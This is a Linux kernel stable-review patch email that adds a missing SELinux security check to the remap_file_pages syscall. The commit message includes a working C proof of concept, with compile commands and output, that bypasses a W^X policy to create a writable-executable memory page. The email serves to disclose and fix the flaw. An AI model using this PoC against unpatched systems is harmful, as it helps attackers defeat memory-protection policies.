Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4D4101974F4;
	Wed,  2 Oct 2024 14:43:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=10.30.226.201
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1727880220; cv=none; b=am3NvAkksAIqd7rEA9vN+ESJs2jBk+tIzGqyMqv/DaauizsVLLGmcjbbBDQUDsEB2LDlx86rYShaha4dumzQuChfGl8YQi6rGWoCOtj8hd5JCJRpoSRFRM21XjK06BWwHKRZwQI/IQ+263jpSas83kDxAmQWxfoK/nM6164rgq8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1727880220; c=relaxed/simple;
	bh=XKxN/wnqBO+NDZxJVPFws6orc6cM4n1zH/TxSweV8Uo=;
	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
	 MIME-Version; b=XoOMf3rhsQFc8gQMdvKW/SUyn9XQyd5r2oh+t1lY+ibXVK0JcZ6yZPQX/liHTFnv+kjhc630PxhaLeSORjQNsMHFmC2hbqOjgtYwR76OVaDIRuYpmaLwtqpiyjDZ1R0Pu5IVYML/uFTQbd/x/z9hzuk8bmKipy2jx+LxQlo4Wjk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b=jFyMvHXq; arc=none smtp.client-ip=10.30.226.201
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=linuxfoundation.org header.i=@linuxfoundation.org header.b="jFyMvHXq"
Received: by smtp.kernel.org (Postfix) with ESMTPSA id C6B78C4CEC2;
	Wed,  2 Oct 2024 14:43:39 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=linuxfoundation.org;
	s=korg; t=1727880220;
	bh=XKxN/wnqBO+NDZxJVPFws6orc6cM4n1zH/TxSweV8Uo=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References:From;
	b=jFyMvHXqXZbpnBPkJc1sXcyULgSoOUW/1vnaSy6RTQqslUBs5BqCSisiOFqFD9IUF
	 qqOoCKUcS4ZPwmKtyvfiVjDnfT6M27buuDuWy8Da0GTiUu2cFyycGwd/de04beMCV+
	 4NHWraTu4H5yuWv7x5nXZo2K/Dcz5lKKDwME/hLg=
From: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
To: stable@vger.kernel.org
Cc: Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
	patches@lists.linux.dev,
	Shu Han <ebpqwerty472123@gmail.com>,
	Stephen Smalley <stephen.smalley.work@gmail.com>,
	Paul Moore <paul@paul-moore.com>
Subject: [PATCH 6.6 384/538] mm: call the security_mmap_file() LSM hook in remap_file_pages()
Date: Wed,  2 Oct 2024 15:00:23 +0200
Message-ID: <20241002125807.588416884@linuxfoundation.org>
X-Mailer: git-send-email 2.46.2
In-Reply-To: <20241002125751.964700919@linuxfoundation.org>
References: <20241002125751.964700919@linuxfoundation.org>
User-Agent: quilt/0.67
X-stable: review
X-Patchwork-Hint: ignore
Precedence: bulk
X-Mailing-List: patches@lists.linux.dev
List-Id: <patches.lists.linux.dev>
List-Subscribe: <mailto:patches+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:patches+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

6.6-stable review patch.  If anyone has any objections, please let me know.

------------------

From: Shu Han <ebpqwerty472123@gmail.com>

commit ea7e2d5e49c05e5db1922387b09ca74aa40f46e2 upstream.

The remap_file_pages syscall handler calls do_mmap() directly, which
doesn't contain the LSM security check. And if the process has called
personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
RW pages, this will actually result in remapping the pages to RWX,
bypassing a W^X policy enforced by SELinux.

So we should check prot by security_mmap_file LSM hook in the
remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
potentially permits an attacker to bypass a W^X policy enforced by
SELinux.

The bypass is similar to CVE-2016-10044, which bypass the same thing via
AIO and can be found in [1].

The PoC:

$ cat > test.c

int main(void) {
	size_t pagesz = sysconf(_SC_PAGE_SIZE);
	int mfd = syscall(SYS_memfd_create, "test", 0);
	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
		MAP_SHARED, mfd, 0);
	unsigned int old = syscall(SYS_personality, 0xffffffff);
	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
	syscall(SYS_personality, old);
	// show the RWX page exists even if W^X policy is enforced
	int fd = open("/proc/self/maps", O_RDONLY);
	unsigned char buf2[1024];
	while (1) {
		int ret = read(fd, buf2, 1024);
		if (ret <= 0) break;
		write(1, buf2, ret);
	}
	close(fd);
}

$ gcc test.c -o test
$ ./test | grep rwx
7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)

Link: https://project-zero.issues.chromium.org/issues/42452389 [1]
Cc: stable@vger.kernel.org
Signed-off-by: Shu Han <ebpqwerty472123@gmail.com>
Acked-by: Stephen Smalley <stephen.smalley.work@gmail.com>
[PM: subject line tweaks]
Signed-off-by: Paul Moore <paul@paul-moore.com>
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
---
 mm/mmap.c |    4 ++++
 1 file changed, 4 insertions(+)

--- a/mm/mmap.c
+++ b/mm/mmap.c
@@ -3025,8 +3025,12 @@ SYSCALL_DEFINE5(remap_file_pages, unsign
 		flags |= MAP_LOCKED;
 
 	file = get_file(vma->vm_file);
+	ret = security_mmap_file(vma->vm_file, prot, flags);
+	if (ret)
+		goto out_fput;
 	ret = do_mmap(vma->vm_file, start, size,
 			prot, flags, 0, pgoff, &populate, NULL);
+out_fput:
 	fput(file);
 out:
 	mmap_write_unlock(mm);


